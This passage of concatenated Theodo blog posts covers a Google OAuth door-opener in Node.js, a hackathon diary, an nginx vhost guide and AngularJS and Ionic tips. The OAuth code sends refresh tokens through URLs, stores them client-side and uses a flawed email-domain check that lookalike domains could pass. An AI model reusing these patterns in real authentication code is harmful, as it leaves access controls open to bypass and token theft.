layout\r\n\r\nblock content\r\n    .body\r\n        h1 Theodo Door\r\n        button#openDoor.btn(type=\"button\") OPEN\r\n\r\n        a#googleSigninButton.btn.btn-primary(\r\n            href=\"\"\r\n        ) Google\r\n\nAt this point, we have a client and an interface. The only missing piece is the logic which will make them work together.\nAuthentication with Oauth\nGoogle offers a client to facilitate OAuth transactions. We only need a Google application. For practical reasons, I will not detail here the steps to create one : you can do it easily by opening the google developer console, creating a new project and configuring the credentials properly (redirect URI is the most important part).\nIn practice, how does an OAuth transaction work?\n\nWe display a link with our application ID and the callback URL where we want Google to answer back\nThis link asks the user if he/she grants the application\nOnce the user accepts it, Google sends back a code to our application\nThen, our node application can ask for a token to read the user data, by sending Google \u00a0our application ID, our secret, and the received code\nGoogle finally sends back that\u00a0access token\u00a0with a refresh token\n\nWhat is the utility of the refresh token? Access tokens have a limited lifetime. A refresh token can be stored server-side to fetch a new access token whenever you need it, and this without new authorization of the user.\nNow, how will we handle this? First we get the refresh token of the user and store it in his/her browser. Then another action will be responsible of fetching this refresh token from the browser and checking the user information to decide if the door is to be opened.\nRight now, you may ask if storing a refresh token client-side and transfer it on the network is a good idea. Indeed, it\u2019s not recommended. We are doing it here for three reasons :\n\nThe level of informations we are asking is the most basic (id, email). The criticity of a data theft is low.\nWe are using HTTPS to secure data exchanges in production\nIt\u2019s simple and easy!\n\nGenerating the connection page with Express:\n// Index action. Juste some buttons with the URL for Google Authentication\r\napp.get('/', function(req, res) {\r\n    var authUrl = oauth2Client.generateAuthUrl({\r\n        access_type: 'offline',\r\n        scope: 'https://www.googleapis.com/auth/userinfo.email',\r\n        state: 'profile',\r\n        approval_prompt: 'force'\r\n    });\r\n    res.render('index', {\r\n        authUrl: authUrl\r\n    });\r\n});\r\n\r\n// Action which will read the token sent back by Google\r\napp.get('/oauthcallback', function(req, res) {\r\n    var code = req.query.code;\r\n    oauth2Client.getToken(code, function(err, tokens) {\r\n        if (!\"refresh_token\" in tokens) {\r\n            return res.send(\"Authentication process has failed\");\r\n        }\r\n        // Send back the token to the client in URL\r\n        res.redirect(\"/?refresh_token=\" + tokens.refresh_token);\r\n    });\r\n});\r\n\nClient-side, some javascript code manages to fetch the token in the URL and to store it in local storage.\nFinally, each morning, the application checks if a refresh token is present in local storage. If not the process above is triggered. Otherwise, we send it to our application in AJAX. The remaining step is the easier, we read the domain of the user email with the token, and if the domain match, we call our client to open the door.\napp.post('/api/opendoor', function(req, res) {\r\n    var refresh_token = req.body.refresh_token;\r\n    oauth2Client.credentials = {\r\n        refresh_token: refresh_token\r\n    };\r\n\r\n    googleapis.discover('oauth2', 'v1').execute(function(err, client) {\r\n        if (!err) {\r\n            client.oauth2.userinfo.get().withAuthClient(oauth2Client).execute(function(err, results) {\r\n                var email = results.email;\r\n\r\n                if ((email.indexOf('theodo.fr') + 'theodo.fr'.length) != email.length) {\r\n                    return res.send({\r\n                        status: -1,\r\n                        message: \"Google Plus authentication failed (domain mismatch)\"\r\n                    });\r\n                }\r\n\r\n                doorClient.open();\r\n\r\n                res.send({\r\n                    status: 0,\r\n                    message: 'Door opened. Welcome !'\r\n                });\r\n            });\r\n        }\r\n    });\r\n});\r\n\nAnd voil\u00e0! The whole thing requires a small effort to set it up but offers ourselves a lot of flexibility. A new theodoer is autonomous the very first day of his arrival.\nBonus: HTML5 manifest\nAs a bonus, and in order to render the page as fast as possible, an HTML5 manifest has been added. Basically, the browser will cache the entire page and its assets (JavaScript and stylesheets).\nCACHE MANIFEST\r\n# v0.5\r\nCACHE:\r\n/\r\n/stylesheets/bootstrap.min.css\r\n/stylesheets/style.css\r\nhttp://code.jquery.com/jquery-2.0.3.min.js\r\nhttps://code.jquery.com/jquery-2.0.3.min.js\r\n/javascripts/door.js\r\n/javascripts/jquery-2.0.3.min.js\r\n\nThanks to this, once the token is safely stored in the local storage, the sole data transmitted to the server is the only important information: the user token.\nA demo of the application can be seen at http://matthieua.cloud.theo.do and sources will be available soon on Github.\nFinally if you want to use it for real, why don\u2019t you join us?\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMatthieu Auger\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHackathon@42 #SocieteGenerale\nLast week-end (23rd-25th May 2014) was an industrious one: our dream team (Adlen, David and Jean-R\u00e9mi) participated in Soci\u00e9t\u00e9 G\u00e9n\u00e9rale\u2019s first hackathon in the brand new information-technology school 42.\nThe theme was inspiring: \u201ca hackathon by devs for devs\u201d. Imagining tools oftomorrow\u2019s IT departments in big companies like SG.\nFriday, May 23rd\n19h45: Arrival at the \u201cEcole 42\u201d, we just have enough time to grab a drink before heading to the conference room.\n20h: BeMyApp and Soci\u00e9t\u00e9 G\u00e9n\u00e9rale staff introduce the weekend planning and then anyone with an idea gets 1 minute to pitch it. The heads of SG\u2019s IT Department remind everyone of the hackathon\u2019s focus and insist heavily on \u201ccontinuous delivery\u201d topics as the main challenge for tomorrow.\n20h36: Fire alarm sets off in the school. Who started off a barbecue in the basement?!\n20h53: Back to pitches but without electricity so no more slides or microphones. Fortunately, everyone remains really quiet.\n\n~21h30: It took David 40 seconds to pitch the idea we had the day before: IT departments want to develop and deploy faster to build products that better fit their clients\u2019 needs. To encourage their collaborators to implement the methods leading to continuous delivery, they need a synthetic overview of their projects with relevant metrics: time since last deployment or release, evolution of deployment frequency, continuous integration and so on. It\u2019s like Google Analytics, but with development metrics instead of only usage metrics.\n21h45: End of pitches and dinner. We find the name of our project, Devops Metrix, while eating sushis and talking to cool people. It\u2019s a mix of matrix and metrics so it sounds kinda cool.\n22h30: Hackathon begins. We head to one of the school\u2019s \u201cclusters\u201d, where around 250 iMacs stand. Space optimization is quite impressive. So impressive that it\u2019s difficult to put our laptops on the desks and use wired connection at the same time.\n\n22h32: Our repository is created on Github and everyone is added as collaborator.\n22h47: OpenStack instance: up. Nginx server: configured. Project\u2019s landing page: online (at the time, it\u2019s only \u201c`Devops Metrix\u201c`). We\u2019re in  production.\nWe love DevOps spirit <3\n22h50: First User Story written on Trello. Here is our board (in French).\n23h14: Automatic deployment script with Capistrano running. It\u2019s so cool to be in production before everyone else that we decide we\u2019ve coded enough for the night. Let\u2019s take a step back and think about what we need to code and prioritize our user stories. \n23h47: Let\u2019s leave to get some sleep, or go clubbing!\n\nSaturday, May 24th\n9h30: Back to start the first full day. Compared to a few very brave competitors, the three of us are well rested (even after clubbing!). We have already decided which technologies to use for this hackathon, the choice was easy since they are our daily tools:\n\nAngular.js for the front\nBower to handle dependencies\nGulp.js as build system\nD3.js to render the visualization\nCapistrano for continuous deployment\nA VM on OpenStack as server\nCoffeeScript, Jade and Less for clean syntax\n\n10h12: We\u2019ve just ended the basic bootstrapping of our Angular app using Gulp.js (You can find David\u2019s book on Gulp.js here). Let\u2019s take a moment for some coffee or tea before ending the import of our dependencies like Bootstrap or Angular routes.\n11h30-50: We love Scrum so much that even for less than 2 days we decide to use its principles. We make our sprint planning meeting for the first iteration. Well, we will only make reviews for this hackathon. The planning was only our feeling on what can be done during the given time. Let\u2019s write our user stories and then pick our sprint goal: \u201cHaving a functional home page displaying the projects and a couple of metrics\u201d.\n11h53: We do not want to use the iMacs to code but we pick two of them, one to display our Trello board and the second one to display our live website. It is really cool to display them on those large screens.\nNow let\u2019s write some code! Since our project focuses on the display of projects Adlen and Jean-R\u00e9mi pair-program to develop the fixtures generation and the basic display of the project as a list. Meanwhile, David handles the first design of the app and the caption. Then we \u201cter-program\u201d on the scatter plot display to grasp all together our core feature. We are now all able to improve the visualization of our bubbles.\n\n14h29: BeMyApp organizes 4 code challenges during this hackathon with prizes. The first one starts in one minute! It is algorithmic challenges in JavaScript.\n14h35: We\u2019ve just won a Nerf! It is difficult to remember JavaScript syntax since we are so used to CoffeeScript <3\n15h23: Our bubbles are now successfully updated each 100ms without freezing the whole application, yeah!\n15h29: Code Challenge in one minute !\n15h33: We\u2019ve just won a Nerf!\n16h11: A mentor from Soci\u00e9t\u00e9 G\u00e9n\u00e9rale comes and gives us valuable insight. He suggests that we add a usage chart in the application\u2019s details page. His point is that since our tool allows managers to monitor applications from the very beginning of their development, it should also show when an application is no longer used. This metric is very valuable for the decision making process enabled by our tool. For instance, if an application is no longer used, the manager could decide to cut its budget and reallocate it to another project.\n19h00-30: Our first sprint is over. We\u2019ve managed to do all our stories. Great. We may now start our second sprint, the goal of which is \u201cWhen I zoom on a project I can see the KPIs of this project, updated in real time\u201d\nWe are so thrilled by the project, the atmosphere is great, we love our dashboard and we can do what we want with it. It is so good to be a developer.\n21h18: Time to have dinner! The Champion\u2019s league finale was streamed live in the common space, sweet!\n0h30: Our second sprint is over. Let\u2019s leave to get some sleep!\nSunday, May 25th\n10h30: Back to work, a bit later than yesterday because of the European elections.\n10h30-10h40: We start this last day with our last sprint meeting, this one will be really short. The competition ends in about 5 hours and we have to prepare our pitch. The sprint goal is to improve our design based on Charlotte\u2019s feedback.\n10h53: Maud from BeMyApp offers us to participate in the \u201cDraw my app\u201d workshop, a 90 seconds presentation with a live drawing of the app to practice our pitch. Adlen is chosen to handle this task.\n\n10h59: Code Challenge in one minute !\n11h08: We\u2019ve just won a Nerf!\n14h29: Code Challenge in one minute!\n14h42: Wait\u2026 this challenge is really hard, we have to find how the input is encrypted. It looks like Caesar cipher but with some weird adding of spaces and points.\n15h: We decide that preparing our pitch has the highest priority level. We thus stop wasting time on the challenge. Jean-R\u00e9mi is ending our design. David had already begun to write some slides a couple hours ago. We chose to use only simple slides to introduce the metrics we used.\nNow let\u2019s rehearse the presentation. Oh wait\u2026 7 mentors from Soci\u00e9t\u00e9 G\u00e9n\u00e9rale are around us, asking for a demo and explanation of our dashboard. They appreciate it and ask very relevant questions, starting a constructive discussion about their work methodology, sweet.\n15h45: Code Challenge now! Only one person found the previous solution, so here is a simpler exercise.\n15h46: We\u2019ve just won a Nerf! This one was quite easy :p\n15h48: Time to go back to the conference room.\n16h: The pitch contest starts! We will be the 7th out of 26 teams. Here are our presentation slides, we will have 3 minutes to pitch (questions included)\n16h28: It is our turn!\n\n16h28: Wow, 3 minutes is really short.\n18h: The pitches end on time. It\u2019s time for the jury to deliberate.\n19h14: The jury have chosen their top 3. The suspense is not long, the three winners are:\n\nAnthill, a suggestion box\nVivamus, a collaborative coding tool like nitrous.io or Codebox\nSheldon, \u201cPocket for developers\u201d\n\nThe jury was composed of top executives at Soci\u00e9t\u00e9 G\u00e9n\u00e9rale whereas the coaches were managers or developers.\nWe were a bit surprised of the jury\u2019s choices. On one hand, the coaches expressed deeply technical needs before and during the hackathon. They were mostly project managers and developers. On the other hand, the jury was composed of top executives who seemed to have valued technical aspects less. Such a gap between the needs of each management level is understandable. Strategic alignment is a difficult goal to achieve.\nNevertheless, we enjoyed taking part in this hackathon. We met outstanding teams and very nice people that developed awesome concepts like What I use\nor Captain. This weekend gave us the motivation to answer one of our long-identified needs: visualize the status of all our projects. Of course, there remains some work to do before our tool is fully functional but the biggest part is here. Stay tuned for the next release. And come help us connect it to real data on GitHub if you\u2019re interested!\nKey takeaways\n\nFind the smallest set of features you need AND the simplest implementation of them (have a look at MVP for more)\nSpending some time away from code or sleeping may be an investment worth considering\nKnow your tools, you neither want nor have time to spend on discovering them\nEnjoy!\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAdlen Afane\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThe purpose of this article is to explain the basic things you\u2019ll need when you start using nginx. I will assume that we are on a ubuntu Trusty(14.04) OS, I let the readers translate the command for their own OS.\nWhy Nginx?\nNginx is the \u201cnew\u201d popular webserver that competes with Apache. So why use it?\nLet\u2019s take a quote from the wiki:\n\u201cApache is like Microsoft Word, it has a million options but you only need six. Nginx does those six things, and it does five of them 50 times faster than Apache.\u201d\n\u2014 Chris Lea\n\nInstallation and useful commands\nIt\u2019s very simple on ubuntu:\n$ apt-get install nginx\r\n\nIf you need to run some PHP you need to also install FPM\n$ apt-get install php7.0-fpm\r\n\nThen you can manage it with the classic services commands like:\n$ service nginx start\r\n$ service php7.0-fpm restart\r\n\nIf your nginx webserver doesn\u2019t start, you may have a problem in your conf. To have more info you can test your nginx conf with this command:\n$ nginx -t\r\n\nIf everything is good you should see something like:\nnginx: the configuration file /etc/nginx/nginx.conf syntax is ok\r\nnginx: configuration file /etc/nginx/nginx.conf test is successful\r\n\nSome basic vhosts\nI will now show you some vhosts and explain their use cases but first let\u2019s have a look in the /etc/nginx/nginx.conf file. By default there are already basic settings.\nuser www-data;\r\n\nThis line means that Nginx will run as the www-data user (as Apache usually does).\nIf you continue through the file you can see where the logs will be recorded by default, and then you have those lines\n##\r\n# Virtual Host Configs\r\n##\r\n\r\ninclude /etc/nginx/conf.d/*.conf;\r\ninclude /etc/nginx/sites-enabled/*;\r\n\nAs you have guessed, thoses lines include all conf from conf.d directory and all vhosts defined in sites-enabled. Therefore all the vhosts files below need to be in the sites-enabled directory and will be automatically loaded in nginx (after a reload or restart).\nHow to host a basic html website\nIf you only need to serve html pages. All you need for your vhosts is:\nserver {\r\n    listen      80 default_server;\r\n    root        /var/www/;\r\n}\r\n\nIt creates a default webserver that listens on the regular port 80 where basic http requests from browsers come. It also indicates that the root of your website is located at /var/www/. To display your website you only have to create a /var/www/index.html file and it will work.\nBasic html website with a server_name\nIf you want to host many websites on the same machine. You need to use server_name directive so nginx can know which files it has to serve.\nserver {\r\n    listen      80;\r\n    server_name www.myamazingwebsite.com;\r\n    root        /var/www/myamazingwebsite/;\r\n}\r\n\r\nserver {\r\n    listen      80;\r\n    server_name www.notsobadwebsite.com;\r\n    root        /var/www/notsobadwebsite;\r\n}\r\n\nYou can also use it to protect yourself against people who create a fake domain name for your website. Like if your dns is like that:\nmyamazingwebsite.com.        A      173.194.41.191\r\n\nSomeone can buy \u201cthisisashittywebsite.com\u201d domain name and create this DNS A record:\nthisisashittywebsite.com.    A      173.194.41.191\r\n\nAnd people going on thisisashittywebsite.com will see your website unless you specified a server_name.\nMore informations about server_names\nBasic PHP website\nIf you need to run some PHP pages, you will need to use the FastCGI-server.\nserver {\r\n    listen 80;\r\n    server_name nginx-php.demo;\r\n    root        /var/www/php/;\r\n\r\n    location ~ \\.php {\r\n        fastcgi_index index.php;\r\n        fastcgi_pass unix:/var/run/php5-fpm.sock;\r\n        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\r\n        include fastcgi_params;\r\n    }\r\n}\r\n\nWe use location directive to tell nginx that urls matching *.php need to use fastcgi. The fastcgi_pass tells nginx the socket on which FastCGI-server is listening.\nSymfony website\nThis is an example conf for symfony websites in dev mode.\nserver {\r\n    listen      80;\r\n    server_name nginx-symfony.demo;\r\n    root        /var/www/symfony/web;\r\n\r\n    #We add the logs\r\n    error_log /var/www/symfony/app/logs/nginx.error.log;\r\n    access_log /var/www/symfony/app/logs/nginx.access.log;\r\n\r\n    #We activate gzip\r\n    gzip            on;\r\n    gzip_min_length 1000;\r\n    gzip_comp_level 9;\r\n    gzip_proxied    any;\r\n    gzip_types      application/javascript application/x-javascript application/json text/css;\r\n\r\n    #default index\r\n    index app_dev.php;\r\n\r\n    #So we don't have to see the app_dev.php or the app.php of symfony\r\n    try_files $uri @rewrite;\r\n    location @rewrite {\r\n        rewrite ^/?(.*)$ /app_dev.php/$1 last;\r\n    }\r\n\r\n    location ~ ^/(app|app_dev)\\.php {\r\n        fastcgi_index $1.php;\r\n        fastcgi_pass unix:/var/run/php5-fpm.sock;\r\n        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\r\n        include fastcgi_params;\r\n\r\n        # Added to avoid 502 Bad Gateway errors\r\n        fastcgi_buffer_size 512k;\r\n        fastcgi_buffers 16 512k;\r\n    }\r\n\r\n    #HTTP 304 NOT CHANGED \r\n    location ~* \\.(css|txt|xml|js|gif|jpe?g|png|ico)$ {\r\n        expires 1y;\r\n        log_not_found off;\r\n    }\r\n}\r\n\nHttps website\nIf your website needs secure communications between your server and the client, you will need to enable ssl on your webserver. The vhost below redirects every http requests to the https equivalent. It also configures your server to use a custom certificate that you would have put in the conf.d directory.\nserver {\r\n    listen      80;\r\n    root        /var/www/https;\r\n    server_name nginx-https.demo;\r\n\r\n    #Permanent redirection\r\n    return 301 https://nginx-https.demo$request_uri;\r\n}\r\n\r\nserver {\r\n    listen      443 ssl; #default https port\r\n    root        /var/www/https/;\r\n\r\n    access_log /var/log/nginx/https.access.log;\r\n    error_log /var/log/nginx/https.error.log;\r\n\r\n    server_name         nginx-https.demo;\r\n    ssl_certificate     conf.d/myssl.pem;\r\n    ssl_certificate_key conf.d/myssl.key;\r\n    ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;\r\n    ssl_ciphers         ALL:!EXP:!LOW:!DSS:!3DES:!PSK:!aNULL:!eNULL:!RC4:HIGH:!aNULL:!MD5;\r\n    ssl_prefer_server_ciphers   on;\r\n}\r\n\nMost of the time, for production you won\u2019t generate your custom certificate but you\u2019ll buy one. Have a look at the nginx\u2019s documentation for more information.\nReverse proxy\n\nThere are many cases where you can need a reverse proxy. Nginx is known to make it very easy the use of reverse proxies. At Theodo, we use it in most of our AngularJs apps that call a node server through a reverse proxy.\nHere is an example where everything is proxified to the 8080 port.\nserver {\r\n        listen 80;\r\n        server_name nginx-proxy.demo;\r\n\r\n        #Every url starting by '/' are proxified to 127.0.0.1:8080\r\n        location / {\r\n                #You can specify which dns server or /etc/hosts file to resolve the domain\r\n                resolver localhost; \r\n\r\n                #Set the header to keep the IP of the client\r\n                proxy_set_header X-Real-IP $remote_addr;\r\n                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\r\n\r\n                proxy_pass http://127.0.0.1:8080;\r\n        }\r\n}\r\n\r\n#You can put here a lot of services that don't listen to the port 80. Like a node server.\r\nserver {\r\n        listen 8080;\r\n        root        /var/www/simple-proxy/;\r\n\r\n        access_log /var/log/nginx/proxy.access.log myCustomLog;\r\n        error_log /var/log/nginx/proxy.error.log;\r\n\r\n}\r\n\nThe proxy_pass directive is the most important directive. It\u2019s here that you specify the machine and the port where you want to proxify the request. Behind a proxy, you might want to modify the way your logs are recorded. I have here chosen a custom format for the access_log.\nYou can create your own log_format by creating a myCustomLog.conf file in the conf.d directory\nlog_format myCustomLog \r\n    '$remote_addr forwarded for $proxy_add_x_forwarded_for - $remote_user [$time_local] '\r\n    '\"$request\" $status $body_bytes_sent '\r\n    '\"$http_referer\" \"$http_user_agent\"'\r\n    'real_ip $http_x_real_ip';\r\n\nHere is a quick list of nginx variables that you can use (The complete one is here).\n\n$remote_addr        The remote host\n$remote_user        The authenticated user (if any)\n$time_local         The time of the access\n$request            The first line of the request\n$status             The status of the request\n$body_bytes_sent    The size of the server\u2019s response, in bytes\n$http_referer       The referrer URL, taken from the request\u2019s headers\n$http_user_agent    The user agent, taken from the request\u2019s headers\n\nSandbox\nWe have seen some examples of nginx vhosts that will cover most of your basic needs. I have also made a sandbox with Vagrant and Ansible to allow you to easily test different nginx configurations. There is even a little exercise in the README.\nIf you have some ideas for pertinent vhosts or exercises don\u2019t hesitate to make a PR!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIt is just a little heads up \u2013 I have published a small Extension for Behat 2 days ago.\nIt helps optimize your behat steps by displaying the time taken by every step in console log.\nYou can check it out on Github: TheodoBehatProfilingExtension.\nThe current version is compatible with Behat 2.4+ but a Behat 3 version will be coming soon.\nIf you have any comments or feature requests don\u2019t hesitate to open an issue on GitHub.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMarek Kalnik\r\n  \t\t\t\r\n  \t\t\t\tMarek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA few months ago when joining Theodo team, we discovered what JavaScript is really about, and we (Aur\u00e9lie and David) decided to share on this blog our journey through AngularJS. This framework, developed and supported by no less than Google, is about to (or already has?) change the way we develop web applications today. This series of quick posts aims to guide newbies like we were not so long ago on the path to this really cool and promising technology.\n\nServer-side web application are disappearing\nThe web is historically dominated by servers. The client only calls an URL, then all the magic happens in the server: it resolves routes, picks values in databases, applies some treatment to it, renders them in a template and finally returns a fully prepared page. If you want other infos, use a link, then you will navigate to another page and all this process recurs.\nBut this era is coming to an end. Users do not want to refresh a full page each time they trigger a filter or something similar, particularly in a mobile context. To ensure the best UX possible, some code has to be executed client-side. That\u2019s where Javascript comes in. Just put this code in\u00a0<script>\u00a0tag, and, as long as the browser is compatible with the version of Javascript you are using, it will execute it.\nAs we always want more interactivity in our web apps, we find ourselves writing numerous lines of Javascript in our pages. And it starts to become like an horror story: no easy way to test this code, no organization, no reusability\u2026 It\u2019s spaghetti code, and it tastes like evil, leading us to many bugs and reducing reliability and confidence in the app.\nAngularJS, an organized client-side solution\nThat\u2019s where AngularJS comes to rescue us, poor jQuery abusers. It introduces itself as a Javascript framework, even if some can argue it looks like a library. It brings server\u2019s code organization to the client. It opens a broad way to tests and reusability. We see it as the best anti-stress for frontend developers.\nAngularJS introduces new concepts to frontend development, that seem disturbing at first. Don\u2019t panic: the learning curve is no cliff. We are here to guide you smoothly through all these new concepts. And if you are familiar with server-side frameworks, you\u2019ll recognize some of the architecture.\nAs AngularJS is quite recent, many aspects of its development are not really standardized yet. We\u2019ll humbly present you our choices regarding practices and organization. Don\u2019t take it as holy words: we encourage you to experiment and make your own opinion about best practices to follow.\nWe obviously won\u2019t be covering everything about AngularJS in this first chapter, so let\u2019s focus on the very beginning: a short introduction of the different notions you\u2019ll meet when exploring AngularJS.\nMVVM: wait what?\nAngularJS is a MVVM framework. Sorry\u2026 what? MVVM stands for\u00a0Model\u00a0View\u00a0ViewModel framework. It means it uses an architecture divided in three parts:\n\nThe model : it represents your data. It consists of JavaScript objects.\nThe view: it describes what users will see. It\u2019s basically HTML and CSS, with some Angular-flavored markup.\nThe view-model: it\u2019s the link between the previous two, it exposes model data to the view.\n\nDecoupling all of these leads to separating the business logic from the presentation logic. You\u2019ll discover that it makes your code more reusable and more testable, and you\u2019ll learn soon enough why it\u2019s important. Moreover, AngularJS takes care of keeping all the data updated and synchronized. When the view is modified, the model automatically reflects these changes using the ViewModel. You change the model, the view is also automatically updated the same way. Awe-so-me.\nTime for action!\nFirst, take a look at\u00a0app.js. We just set a module named \u201capp\u201d. For now, just see it as a wrapper for our application, we will talk about modules longer in the next chapter.\nNow get to\u00a0deck.js. This is our model. It\u2019s a very simple one: just a simple JavaScript object (we\u2019ll keep it dead simple for now). As Aur\u00e9lie is an expert player of Magic The Gathering, we\u2019ll use some of her cards for this example.\nLet\u2019s go to\u00a0deckController.js. We add to our application a controller, which is the view-model part of Angular\u2019s MVVM. A controller defines a scope, which is a bag of variables accessible to the view. For the moment, our controller just adds our model to the scope. Later it could offer some extra functions to manipulate it.\nLast but not least, the view:\u00a0index.html. As you can see, it\u2019s a simple HTML page except for the attributes\u00a0ng\u00a0like\u00a0ng-app=\"app\"\u00a0telling AngularJS it should use our module named \u201capp\u201d to process the part of the page the attribute is on.\u00a0ng-controller=\"deckController\"\u00a0tells Angular to instantiate this controller and its scope to render the content of the tag, which is a\u00a0div\u00a0here. This part of the DOM and the controller scope data are now bound. Surrounding a scope variable like\u00a0deck\u00a0in double curly braces will make its value appear in the view.\nStep 1\nThis JSON data is not very user-friendly. We can use another attribute:\u00a0ng-repeat\u00a0(which is a built-in function of Angular) to iterate through the\u00a0deck\u00a0array. The\u00a0<li>\u00a0block will be repeated for each card in\u00a0deck.\u00a0ng-repeat\u00a0syntax is very similar to\u00a0for \u2026 in \u2026\u00a0block in JavaScript. Let\u2019s simply display the card name and its cost.\nStep 2\nNow that we\u2019ve seen the binding from the model to the view, let\u2019s demonstrate the other way, and how magically Angular updates all theses bindings. Let\u2019s add a comment field: an input area bound (with\u00a0ng-model) to the model\u00a0card.comment, and display its value above it. And now, if you type text into the input, the data is magically updated in the model, leading the view to be updated just above.\nStep 3\nPreviews\nIn the next chapter, we will talk more about these magic attributes, and how you can build your own. These are named directives, and this is one of the most important concept of AngularJS.\nWe hope you enjoyed reading this post. See you soon!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAurelie Violette\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIonic is a great tool to bootstrap mobile applications easily. It is a framework based on Cordova and AngularJS and it provides some command line tools, mobile-ready directives for common components, and CSS for a basic application look and feel.\nWe use it together with LeafletJs. Leaflet is a robust OpenStreetMaps based map library, that makes integrating maps in your application a breeze. It is compatible with computer browsers as well as mobile devices.\nIf you are going to use them you need to know some basics about how mobile touch events are managed. It will spare you some nasty bugs.\nBoth libraries use dedicated modules to manage mobile touch events. The modules have two tasks \u2013 managing \"click\" events and working around known bugs.\nThe first usage is managed by code like this. As you can see, a click event is launched even on tap (touchdown) so you can use it for both desktop and mobile purposes. This give a nice compatibility, especially for third party libraries.\nIt contains some heavy logic to differentiate the click from drags and so on, but it is basically that.\nThe other is mostly about avoiding a multiclick on Android devices. Sometimes Android launches multiple events instead of one and this can cause your listeners to be called twice. This is managed by comparing the time since last event.\nBoth libraries implement the logic a bit differently, so they are not always compatible. This can cause bugs, like Leaflet buttons not working etc.\nThe solution was implemented by Ionic \u2013 you can disable its touch events management by adding a special attribute on your map container:\n\r\n<div data-tap-disabled=\"true\"> <div id=\"map\"></div> </div>\r\n\nThis will completly disable Ionic part of event management and Leaflet will be able to handle all by itself.\n\nHope this article spares you some headaches!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMarek Kalnik\r\n  \t\t\t\r\n  \t\t\t\tMarek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nWhen my friend Cyril and I arrived at Theodo, we were amazed to see that although everybody knew we were big into the open-source scene, nobody here really knew about each other\u2019s actual contributions. And these guys play cards every day!\n\n\n\nCyril and me at Theodo\n\u00a0\n\nSince we heavily rely on\u00a0open source initiatives for all of our projects, and contribute to these projects to enhance, fix or provide new features, we thought it\u2019d be a good idea to show it \u2026 and share everything with our followers. So we decided to set up a page with all the relevant information : contributions, speeches and the conferences we sponsored. It\u2019s simply called open-source.theo.do and, I quote our friends here \u201cit\u2019s awesome\u201d.\n\n\nThe list is automatically updated once a day: we rely on Ohloh.net to get everything about the open source projects of our developers. Some of them still have to register but we already have quite a lot to show.\nTechnically, we used angular.js for the interface, it\u2019s amazing how simple and powerful it was to use for our project. And single page apps are so nice! For fetching the data, we use Node.js: it was perfect for our use and blazing fast to setup.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably 